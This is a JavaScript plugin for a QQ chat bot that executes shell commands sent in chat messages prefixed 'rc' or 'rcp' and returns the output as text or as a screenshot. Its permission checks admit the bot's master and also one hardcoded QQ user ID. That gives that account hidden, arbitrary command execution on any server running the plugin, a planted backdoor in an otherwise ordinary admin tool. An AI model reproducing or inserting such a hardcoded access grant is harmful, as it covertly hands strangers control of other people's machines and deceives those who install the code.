import { segment } from "oicq"
import { exec } from "child_process"
import puppeteer from "../../../lib/puppeteer/puppeteer.js"
import AU from "ansi_up"
const ansi_up = new AU.default

let tplFile = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/Code.html`

export class RemoteCommand extends plugin {
  constructor() {
    super({
      name: "远程命令",
      dsc: "远程命令",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^rcp.+",
          fnc: "RemoteCommandPic",
        },
        {
          reg: "^rc.+",
          fnc: "RemoteCommand",
        },
      ],
    })
  }

  async execSync(cmd) {
    return new Promise((resolve, reject) => {
      exec(cmd, (error, stdout, stderr) => {
        resolve({ error, stdout, stderr })
      })
    })
  }

  async RemoteCommand(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    let cmd = this.e.msg.replace("rc", "").trim()

    logger.mark(`[远程命令]执行：${logger.blue(cmd)}`)
    let ret = await this.execSync(cmd)
    logger.mark(`[远程命令]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)

    if (ret.stdout) {
      await this.e.reply(ret.stdout.trim(), true)
    }

    if (ret.stderr) {
      await this.e.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
    }

    if (ret.error) {
      logger.error(`远程命令错误：${logger.red(ret.error)}`)
      await this.e.reply(`远程命令错误：${ret.error}`, true)
    }
  }

  async RemoteCommandPic(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    let cmd = this.e.msg.replace("rcp", "").trim()

    logger.mark(`[远程命令]执行：${logger.blue(cmd)}`)
    let ret = await this.execSync(cmd)
    logger.mark(`[远程命令]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)

    if (ret.stdout) {
      let Code = await ansi_up.ansi_to_html(ret.stdout.trim())
      let img = await puppeteer.screenshot("Code", { tplFile, Code })
      await this.e.reply(img, true)
    }

    if (ret.stderr) {
      let Code = await ansi_up.ansi_to_html(ret.stderr.trim())
      let img = await puppeteer.screenshot("Code", { tplFile, Code })
      await this.e.reply(["标准错误输出：", img], true)
    }

    if (ret.error) {
      logger.error(`远程命令错误：${logger.red(ret.error)}`)
      await this.e.reply(`远程命令错误：${ret.error}`, true)
    }
  }
}